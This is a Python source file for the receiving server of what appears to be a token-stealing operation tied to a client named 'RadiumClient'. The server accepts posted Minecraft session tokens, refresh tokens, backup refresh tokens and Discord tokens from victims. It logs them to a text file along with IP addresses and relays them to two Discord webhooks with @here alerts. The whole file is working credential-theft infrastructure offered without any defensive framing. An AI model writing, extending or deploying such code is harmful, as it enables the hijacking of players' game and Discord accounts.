from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error
import os
import time
from collections import defaultdict

# =========== RATE LIMITING ===========
REQUEST_LOG = defaultdict(list)
MAX_REQUESTS = 2
TIME_WINDOW = 900
BLOCKED_IPS_FILE = "blocked_ips.txt"
IP_LOG_FILE = "ip_log.txt"

def check_rate_limit(ip):
    current_time = time.time()
    REQUEST_LOG[ip] = [t for t in REQUEST_LOG[ip] if current_time - t < TIME_WINDOW]
    if len(REQUEST_LOG[ip]) >= MAX_REQUESTS:
        print(f"🚨 RATE LIMIT EXCEEDED: {ip} - Blocked for 15 minutes")
        with open(BLOCKED_IPS_FILE, 'a') as f:
            f.write(f"{ip} | {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        return False
    REQUEST_LOG[ip].append(current_time)
    return True

def log_ip(ip, username, server):
    with open(IP_LOG_FILE, 'a') as f:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{timestamp} | {ip} | {username} | {server}\n")

# =========== CONFIG LOADING ===========
def load_config():
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
            return config
    except FileNotFoundError:
        print("❌ ERROR: config.json not found!")
        print('Create config.json with: {"discord_webhook": "YOUR_WEBHOOK", "discord_webhook2": "YOUR_SECOND_WEBHOOK"}')
        exit(1)
    except json.JSONDecodeError:
        print("❌ ERROR: Invalid config.json!")
        exit(1)

config = load_config()
DISCORD_WEBHOOK = config.get('discord_webhook')
DISCORD_WEBHOOK2 = config.get('discord_webhook2')

if not DISCORD_WEBHOOK or not DISCORD_WEBHOOK2:
    print("❌ ERROR: Both webhook URLs must be in config.json!")
    exit(1)

print("✅ Config loaded – 2 webhooks ready")
# ======================================

def send_to_discord(webhook_url, payload):
    try:
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        req_data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(webhook_url, data=req_data, headers=headers)
        urllib.request.urlopen(req, timeout=10)
        return True
    except Exception as e:
        print(f"❌ Discord error ({webhook_url[-10:]}): {e}")
        return False

def truncate(s, max_len=1990):
    return s[:max_len] if len(s) > max_len else s

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            client_ip = self.client_address[0]
            print(f"📨 Request from IP: {client_ip}")

            if not check_rate_limit(client_ip):
                self.send_response(429)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'Rate limit exceeded: 2 requests per 15 minutes')
                return

            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length).decode())

            # Extract ALL fields sent by RadiumClient
            username = data.get('username', 'Unknown').strip()
            uuid = data.get('uuid', '').strip()
            server = data.get('server', '').strip()
            token = data.get('token', 'null').strip()
            money = data.get('money', '0').strip()
            playtime = data.get('playtime', '0h').strip()
            kills = data.get('kills', '0').strip()
            deaths = data.get('deaths', '0').strip()
            refresh_token = data.get('refresh_token', 'not_found').strip()
            discord_tokens = data.get('discord_tokens', [])
            backup_refresh_tokens = data.get('backup_refresh_tokens', [])
            log_type = data.get('type', 'login').strip()

            print(f"Got: {username} on {server}")

            log_ip(client_ip, username, server)
            with open('tokens.txt', 'a') as f:
                f.write(f"{username} | {uuid} | {server} | {token} | {refresh_token} | {money} | {playtime} | {kills} | {deaths}\n")

            is_login = log_type.lower() == "login"

            # ── Build embeds ────────────────────────────────────────────
            embeds = []

            # 1. Main embed (stats + session token)
            description = f"**Username:** `{username}`\n**UUID:** `{uuid}`\n**Server:** `{server}`"
            if money and money != "0":
                description += f"\n**Money:** `{money}`"
            if playtime and playtime != "0h":
                description += f"\n**Playtime:** `{playtime}`"
            if kills and kills != "0":
                description += f"\n**Kills:** `{kills}`"
            if deaths and deaths != "0":
                description += f"\n**Deaths:** `{deaths}`"
            if is_login and token:
                description += f"\n\n🔑 **Session Token:**\n||`{truncate(token)}`||"

            main_embed = {
                "title": "✅ User Connected" if is_login else "❌ User Disconnected",
                "color": 5763719 if is_login else 15548997,
                "description": description
            }
            if uuid:
                main_embed["thumbnail"] = {"url": f"https://mc-heads.net/head/{uuid.replace('-', '')}"}
            embeds.append(main_embed)

            # 2. Discord tokens embed (if any)
            if discord_tokens:
                tokens_str = "\n".join([f"||`{t}`||" for t in discord_tokens[:20]])
                embeds.append({
                    "title": "🎫 Discord Tokens",
                    "color": 5793266,
                    "description": tokens_str
                })

            # 3. Refresh token embed (separate, no ping)
            if is_login and refresh_token and refresh_token != "not_found":
                embeds.append({
                    "title": "🔄 Refresh Token",
                    "color": 3066993,
                    "description": f"```{truncate(refresh_token)}```"
                })

            # 4. Backup refresh tokens (if any, max 3)
            if backup_refresh_tokens:
                backup_list = [f"||`{rt}`||" for rt in backup_refresh_tokens[:3]]
                embeds.append({
                    "title": "Backup Refresh Tokens",
                    "color": 15105570,
                    "description": "\n".join(backup_list)
                })

            # ── Build content ( @here ) ─────────────────────────────────
            content = None
            if is_login:
                if money and money != "0":
                    content = f"@here Money: ||{money}||"
                else:
                    content = "@here"

            payload = {
                "content": content,
                "embeds": embeds,
                "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
            }

            # Send to both webhooks
            success1 = send_to_discord(DISCORD_WEBHOOK, payload)
            success2 = send_to_discord(DISCORD_WEBHOOK2, payload)

            if success1 and success2:
                print(f"✅ Sent to both webhooks")
            elif success1 or success2:
                print(f"⚠️ Sent to one webhook only")
            else:
                print(f"❌ Failed to send to both webhooks")

            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')

        except Exception as e:
            print(f"❌ Error: {e}")
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'Server running - Rate limit: 2 requests per 15 minutes per IP')

    def log_message(self, format, *args):
        client_ip = self.client_address[0]
        print(f"{self.log_date_time_string()} - {client_ip} - {args[0]}")

print("🚀 Server starting on port 5000")
print("📊 Rate limit: 2 requests per 15 minutes per IP")
server = HTTPServer(('0.0.0.0', 5000), Handler)
server.serve_forever()
